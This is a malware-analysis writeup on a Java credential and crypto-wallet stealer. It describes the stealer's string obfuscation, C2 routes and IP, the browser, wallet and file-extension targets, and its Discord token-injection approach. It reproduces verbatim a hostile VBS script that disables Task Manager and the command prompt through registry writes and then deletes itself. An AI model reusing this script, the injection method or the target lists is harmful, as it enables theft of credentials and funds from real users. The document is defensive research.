# Inside `emre.jar` — Exastealer v1.0

Reverse of the Java stealer payload that `launcher1.js` extracts and launches.
Complements [`README.md`](README.md) (the delivery chain) and
[`PEYNIR_DLL.md`](PEYNIR_DLL.md) (the native UAC-bypass helper).

The JAR ships **4 539 `.class` files** obfuscated with a custom string-encryption +
control-flow-flattening pass. The obfuscator randomises per-class field and
method names — some classes name their string table `K[]` and their integer
table `x[]`, other classes swap those names. Every method body is flattened
into a `switch(state)` dispatcher with `goto`-style state transitions rather
than plain control flow.

Two decrypt-method variants are used across the package, both keyed by
`getStackTrace()[1]` — the immediate caller's class-name and method-name
hashes are XORed into the mask, so the same ciphertext produces different
plaintext depending on where the call site sits.

**Variant A** (`K(int a, int b)`):
```
idx      = a XOR K_INDEX_MAGIC
caller   = ((callerClass.hashCode() ^ callerMethod.hashCode()) >> 16) ^ CALLER_HASH_MAGIC
for each i in ciphertext K[idx]:
    plaintext[i] = ciphertext[i] XOR (XOR_TABLE[i & 31] XOR (b >> 16) XOR caller)
```

**Variant B** (`K(int a, int b, char c)`):
```
idx      = c XOR K_INDEX_CHAR_MAGIC
caller   = ((callerClass.hashCode() ^ callerMethod.hashCode()) >> 16) ^ CALLER_HASH_MAGIC
for each i in ciphertext K[idx]:
    v = apply_prechain(ciphertext[i])   # sequence of `+ imm` and `^ imm` ops
    plaintext[i] = v XOR caller XOR <one of {a, b}> XOR (<the other> >> 16)
```

The per-class constants (`K_INDEX_MAGIC`, `CALLER_HASH_MAGIC`, the 32-byte
`XOR_TABLE`, the pre-chain, and which int arg is direct/shifted) all appear as
literals inside each class's decrypt-method bytecode.

## How it was peeled

Since running the JAR was off the table, the extraction was static-then-controlled:

1. `javap -c -p` on every class in `com.xc17edb19a.*` — verified **no** `<clinit>`
   does I/O (no `ProcessBuilder`, `Runtime.exec`, `Socket`, `URLConnection`,
   `Files.*`, `loadLibrary`, or `RegistryKey`). One `<clinit>` reads
   `System.getProperty("user.home")` to seed a `STEALTH_BASES` array — that
   contaminates the extracted table with the analysis host's `user.home` value,
   which is why the tables dump is not published from this repo.
2. `Vineflower 1.11.1` decompiled the whole package (`--decompile-inner`,
   `--ignore-invalid-bytecode`, brace-normalised) — CFR bailed on the
   flattened switches.
3. Custom Java reflection dumper (`scripts/dump_tables.java`) loads each
   class inside a fresh `URLClassLoader`, triggers `<clinit>`, and reads every
   `private static final String[]` and `int[]` field by name-agnostic type
   probe. Result: 37 classes with static arrays.
4. Custom Python deobfuscator (`scripts/deobfuscate_strings.py`):
   - parses each decompiled `.java` to find the per-class decrypt method
     signatures and extract the six free constants from their bodies;
   - walks brace depth with a comment/string/char-aware tracker to bind every
     call site to its enclosing binary class name (`Outer$Inner$…` for nested
     types, anonymous inner-class counter for `new I() { … }` blocks) and
     enclosing method name (with `<clinit>` for `static { … }`);
   - reimplements `String.hashCode()` and Java 32-bit arithmetic shift, then
     evaluates the per-call-site decrypt for every match.
   - **2 340 of 2 341** call sites substitute cleanly. The one hold-out is
     a third variant of the string decrypt that appears exactly once in
     `SquEZNKwht`.

## Findings

### C2 protocol

The single C2 endpoint is `http://52.249.219.108:3001`. Recovered routes (from
decrypted strings):

| method | path | purpose |
|---|---|---|
| `POST` | `/api/validate-tokens` | key + Discord-token validation |
| `POST` | `/api/discord-injection/<KEY>` | Discord IPC / injection callback |
| `POST` | `/api/internal/log` | error-and-progress logging |

Transport is plain HTTP. This build ships the key `PANEL-XSER-YZ76-YFMK` in
`PLhWEEjyn.ENCRYPTED_KEY`; it is passed as the `<KEY>` path segment above and
also to `/api/validate-tokens` as the initial handshake. `TfixYBtWK.wsClient`
(referenced from `WmJoRcgQD` and `XkgqXwdrE`) is an `org.java_websocket.client.WebSocketClient`,
so a WebSocket channel is also opened; its full URL is inside the parts of
`TfixYBtWK` that Vineflower could not restructure and is not recovered here.
The JAR calls Discord's real API (`https://discord.com/api/v10/users/@me`,
`https://canary.discord.com/api/v9/users/@me`) to validate captured tokens
before sending them onward.

### Class map (obfuscated → intent)

Recovered from decrypted strings and inner-class type names:

| obfuscated class | role |
|---|---|
| `PLhWEEjyn` | Main-Class. Holds `ENCRYPTED_KEY = "PANEL-XSER-YZ76-YFMK"`, calls `JeJJcSSOx.decryptKey`, and drops a VBS to `%TEMP%\<8-hex>.vbs` that a spawned `wscript.exe //B //Nologo` runs to write the DisableTaskMgr / DisableCMD / NoTrayContextMenu registry values (full VBS reproduced below). |
| `TfixYBtWK` | Holds the WebSocket client — `public static WebSocketClient wsClient` — that other classes (`WmJoRcgQD`, `XkgqXwdrE`) use to `send(...)` exfil frames. Vineflower could not restructure the setup path, so the server URL is not recovered here. Class-level imports also pull in okhttp3 and Apache HttpClient 5. |
| `CsHfiRTnj` + `$User32` | Declares `com.sun.jna.platform.win32.User32` interface bindings; specific User32 calls used are not read here. |
| `JeJJcSSOx` + `$MyCrypt32`, `$NCrypt`, `$NSS`, `$SECItem`, `$DATA_BLOB`, `$MasterKey`, `$ParsedKeyBlob` | Browser credential decryption. Inner classes declare JNA bindings for `Crypt32` (DPAPI `CryptUnprotectData`), `NCrypt` (Chromium AES-GCM master-key unwrap), and Firefox `NSS` (`PK11_CheckUserPassword`, `PK11SDR_Decrypt`, `NSS_Init`, `NSS_Shutdown`). |
| `DmPNptVEeS` + `$SQLite3`, `$Database` | JNA-bound `sqlite3` interface (`$SQLite3`) with a small `$Database` wrapper — used to read Chromium's `Login Data`, `Cookies`, `Web Data` etc. |
| `MMhwxaxcc` | Target catalog. Holds cleartext arrays `DESKTOP_WALLETS`, `EXTENSION_DB`, `BROWSER_PATHS`, `PROFILES` (see below), plus the K/x tables for its own decrypted strings. |
| `XkgqXwdrE` | Holds the `ALLOWED_EXTENSIONS` (90) array — cleartext filenames used to filter files to steal. Also references `TfixYBtWK.wsClient` for exfil. |
| `LzdpgQyS` + `$ProfileData` | Browser profile enumeration; `LzdpgQyS.runExtraction(ZipOutputStream)` is called from `PLhWEEjyn` main via a lambda and writes into a shared `ZipOutputStream`. |
| `maGBqBEy` | Discord token stealer. `maGBqBEy.getTokens()` and `maGBqBEy.killDiscord()` are both called from `PLhWEEjyn.main` lambdas; the log line `"[maGBqBEy] === METHOD 1: Cookie DB + Disk Extraction ==="` and route strings for `https://discord.com/api/v9/users/@me` are recovered from decrypted strings, but the process-kill command itself is inside a `Runtime.exec(K(...))` in `killDiscord` that Vineflower failed to structure, so the exact command is not read. |
| `kvjohfOH` + `$Coin` | Crypto-wallet accessor. Paired with `MMhwxaxcc.DESKTOP_WALLETS` and `MMhwxaxcc.EXTENSION_DB` by import graph; exact per-wallet code paths not read. |
| `UCBjYxHzwv` + `$SteamAccount` | Steam credential stealer (SteamAccount type + 45 references to it). |
| `NjYGKscRL` + anon `$1..$6` | Six anonymous inner classes; the outer holds a 399-entry string table. Decrypted call sites reference Discord auth session URLs, `remote-auth-gateway.discord.gg`, Braintree, and Stripe hostnames, so this appears to be a network-interception pipeline — the per-anon mapping is not confirmed. |
| `wfveoAPd` | Injector. `public static void inject()` is called from `PLhWEEjyn.main` via a lambda. Contains the inline `webpackChunkdiscord_app.push([[Symbol()], {}, o => { ... }])` payload and a `"taskkill /F /IM \""` template. |
| `IvTHdVAG` + `$PEB`, `$PEB_LDR_DATA`, `$RTL_USER_PROCESS_PARAMETERS`, `$UNICODE_STRING`, `$LIST_ENTRY`, `$BIND_OPTS3`, `$GUID`, `$ICMLuaUtil`, `$Ole32`, `$Ntdll`, `$NtdllExt`, `$Kernel32Ext`, `$TOKEN_ELEVATION`, `$X64_CONTEXT`, `$PROCESS_BASIC_INFORMATION` | The **Java-side reimplementation** of the CMSTPLUA / `ICMLuaUtil` elevation-moniker bypass that `peynir.dll` provides natively. Also ships `__NATIVE_CHUNKS` (317 strings) and `__NATIVE_ORDER` (317 ints) whose reassembled bytes match `peynir.dll` — the DLL is embedded in the JAR as well. |
| `SquEZNKwht` + `$DebugLogger`, `$MyKernel32`, `$MyAdvapi32`, `$Shell32`, `$TOKEN_ELEVATION` | Windows API layer + `%TEMP%\debug.log` logger. `SquEZNKwht.DebugLogger.log` is the log entry point used throughout. |
| `zDvfTOGiK` + `$BrowserConfig` | Per-browser config records (paths, profile dir layout, extension DB filename). Its String array (`x[466]`) is the largest per-class table in the JAR. |
| `HIdPkdebB`, `nXstjVHu`, `NGyFAKxu`, `WmJoRcgQD`, `SPwtRpLHG`, `aGQJfZBv$WinError` | Utility / error-code helpers. `NGyFAKxu.main` is a stand-alone `System.out.println` harness left in the build; the others carry supporting logic whose specific roles were not read here. |

### Target catalog

Recovered verbatim from the cleartext `MMhwxaxcc` / `XkgqXwdrE` arrays:

**Browsers scanned** (`BROWSER_PATHS`, 5):

- `%LOCALAPPDATA%\Google\Chrome\User Data`
- `%LOCALAPPDATA%\Microsoft\Edge\User Data`
- `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data`
- `%APPDATA%\Opera Software\Opera Stable`
- `%APPDATA%\Opera Software\Opera GX Stable`

Recovered from decrypted call sites (superset of the above; each channel has
its own `\Local State`, `\Default`, `\Profile N` derivations, and Brave beta /
nightly, AVAST Browser, etc.):

- Brave Beta / Nightly (`AppData\Local\BraveSoftware\Brave-Browser-Beta`, `-Nightly`)
- AVAST Browser (`AppData\Local\AVAST Software\Browser\User Data`)

**Profile dir names probed** (`PROFILES`): `Default`, `Profile 1` … `Profile 5`,
`Guest Profile` (per decrypted call sites).

**Desktop wallets** (`DESKTOP_WALLETS`, 48 — first 20 shown):

- `AppData\Roaming\Exodus`
- `AppData\Roaming\atomic`
- `AppData\Roaming\Binance`
- `AppData\Roaming\Electrum\wallets`
- `AppData\Local\Coinomi`
- `AppData\Roaming\Guarda`
- `AppData\Roaming\com.liberty.jaxx`  (Jaxx Liberty)
- `AppData\Roaming\Zcash`, `Ethereum`, `Bitcoin`, `Litecoin`, `DashCore`, `Dogecoin`
- `AppData\Roaming\monero`, `Monero`
- `AppData\Roaming\Electrum-LTC`, `ElectrumSV`, `ElectronCash`
- `AppData\Roaming\Armory`
- `AppData\Roaming\Trezor Suite`
- … 28 more.

**Browser wallet extensions** (`EXTENSION_DB`, 61 — Chromium extension IDs
loaded from `<profile>\Local Extension Settings\<id>\`). First eight IDs from
the raw array — resolve them against the Chrome Web Store yourself rather
than trusting a mapping here:

```
nkbihfbeogaeaoehlefnkodbefgpgknn
ejbalbakoplchlghecdaalmeeeajnimhm
mclnbpgomkibmidocpdlndicnnandncd
bfnaoomekhelobohpbefokbaekckpjoe
fhbohimaelbohpjbbghcgojmihdcfhbi
hnfanknocfeofbddgcijnmhnfnkdnaad
egjidjbpgmcnihkmyhgghhhebgeachob
ibnejdfjmmkpcnlepejjdphneihoonee
```

(`nkbihfbeogaeaoehlefnkodbefgpgknn` is the well-known **MetaMask** ID;
`ejbalbakoplchlghecdaalmeeeajnimhm` is **Binance Chain Wallet**. The rest are
provided as raw IDs — earlier drafts of this document mapped them to specific
wallet names by guesswork, several wrongly.)

**File-grep extensions** (`ALLOWED_EXTENSIONS`, 90):

```
.7z .aac .ai .avi .bat .bmp .c .cfg .cmd .conf .cpp .cr2 .crw .cs .css .csv
.db .dng .doc .docx .eml .epub .flac .gif .gz .htm .html .ics .ini .java
.jpeg .jpg .js .json .jsx .key .log .m4a .mkv .mov .mp3 .mp4 .mpeg .mpg
.msg .nef .odp .ods .odt .ogg .one .ost .pdf .pem .php .png .ppt .pptx
.ps1 .psd .pst .py .rar .raw .rtf .sh .sql .sqlite .svg .tar .tex .tif
.tiff .ts .tsv .tsx .txt .vcf .wallet .wav .wma .wmv .xls .xlsx .xml
.yaml .zip
```

The `.wallet`, `.key`, `.pem`, `.psd`, `.pst`, `.ost`, `.eml`, `.msg`, `.docx`,
`.xlsx`, `.pdf` set is telltale: wallets, private keys, Outlook stores, and
Office documents that likely contain credentials or recovery phrases.

### Anti-analysis

- **Task Manager disable** in `PLhWEEjyn.disableTaskManager`: drops a random
  `%TEMP%\<8-hex>.vbs` (UTF-8), then launches
  `wscript.exe //B //Nologo <path>` (`//B` is silent, `//Nologo` suppresses the
  banner). The VBS body, verbatim from the decrypted source, is:
  ```vbs
  Set objShell = CreateObject("WScript.Shell")
  ' Disable Task Manager
  objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
  ' Hide Task Manager from taskbar right-click menu
  objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoTrayContextMenu", 1, "REG_DWORD"
  ' Also disable cmd prompt
  objShell.RegWrite "HKCU\Software\Policies\Microsoft\Windows\System\DisableCMD", 1, "REG_DWORD"
  ' Self-delete
  WScript.Sleep 500
  Set objFSO = CreateObject("Scripting.FileSystemObject")
  objFSO.DeleteFile WScript.ScriptFullName, True
  ```
  Pure WSH, no PowerShell.
- **Discord kill** (`maGBqBEy.killDiscord`): shells out through
  `Runtime.getRuntime().exec(K(...))` where the `K(...)` argument is the target
  command. `maGBqBEy.killDiscord` is one of the Vineflower failures in this
  build, so the exact command string is not recovered — `wfveoAPd` separately
  contains the template `"taskkill /F /IM \""` which is the likely shape.
- **Discord renderer injection** (`wfveoAPd.inject` + inline JS):
  `webpackChunkdiscord_app.push([[Symbol()], {}, o => { … }])` pushes a fake
  module into Discord's webpack chunk map. Decrypted `urls: [...]` arrays in
  the injected payload include `wss://remote-auth-gateway.discord.gg/*`,
  `https://*.discord.com/api/v*/auth/sessions`, and Braintree/Stripe token
  endpoints, so the injection targets Discord authentication and payment flows.
- **HTML lures** (`beta-game-setup.html`, `mc-client-setup.html`,
  `watch-setup.html`, `fake-error.html`) are pre-styled Windows-installer
  lookalike windows. `LFVkhEygta.SetupType` enumerates them:
  `GAME_SETUP`, `MC_SETUP`, `WATCH_SETUP`, `FAKE_ERROR` (names verified
  against the decompiled `LFVkhEygta$SetupType` references).

### Build artefacts

- **Build key**: `PANEL-XSER-YZ76-YFMK` — value of `PLhWEEjyn.ENCRYPTED_KEY`
  in this build. Passed to `/api/validate-tokens` and as the `<KEY>` path
  segment on `/api/discord-injection/<KEY>`.
- **Setup-mode CLI flag**: the launcher passes `--startup` to the JAR;
  `PLhWEEjyn.parseSetupType` also checks for `-game`, `-mc`, `-watch`, and
  `-error` to select which HTML lure is presented.
- Language hint: `APP_NAME = "emre"` (a Turkish given name), native shim
  named `peynir` (Turkish for "cheese"). Attribution beyond "Turkish
  strings appear" is not asserted.

## Reproducing the deobfuscation

```bash
# Requires: openjdk 21+ (Homebrew's `openjdk` package), Python 3.9+, sevenzip.
scripts/unpack_installer.sh /path/to/ElriaGame.exe out          # → out/jar/*.class
javac scripts/dump_tables.java && \
  java -cp scripts DumpTables out/data/emre.jar out/tables.json  # ~5s, triggers <clinit>s
# Decompile the obfuscated package with Vineflower before running the script
java -jar vineflower-1.11.1.jar out/data/emre.jar out/decomp \
    --decompile-inner=1 --ignore-invalid-bytecode=1
python3 scripts/deobfuscate_strings.py out                        # ~30s, 99.96% success
# out/decomp-decrypted/com/xc17edb19a/*.java now carries the substituted literals.
```

`out/tables.json` is deliberately **not** published: it embeds the analysis
host's `user.home` value (leaked by `IvTHdVAG.STEALTH_BASES[0]`'s `<clinit>`
reading `System.getProperty("user.home")`), and it also carries the
base64-chunked bytes of `peynir.dll` in `__NATIVE_CHUNKS`. Run the extractor
locally to reproduce.

The full decrypted Java source is likewise not published — it is a working
stealer, and this repo's policy is analysis + tooling, not payload
redistribution.

## Open items

- One 3-arg `x`-named string decrypt in `SquEZNKwht` uses a fourth variant I
  have not modelled; it holds 4 strings I have not read.
- `TfixYBtWK` (the WebSocket client owner) and `maGBqBEy.killDiscord` both
  defeated Vineflower's control-flow restructuring. Their exact strings
  (WebSocket URL; the `Runtime.exec(...)` command) are not recovered here.
  A hand pass over the raw bytecode would resolve both.
- `__NATIVE_CHUNKS` reassembly (base64-decode + reorder by `__NATIVE_ORDER`)
  should equal `peynir.dll` — this is expected but not verified in-session.
- Whether the `-game` / `-mc` / `-watch` / `-error` selector affects only
  which HTML window is displayed, or gates different stealer paths, is not
  answered here.
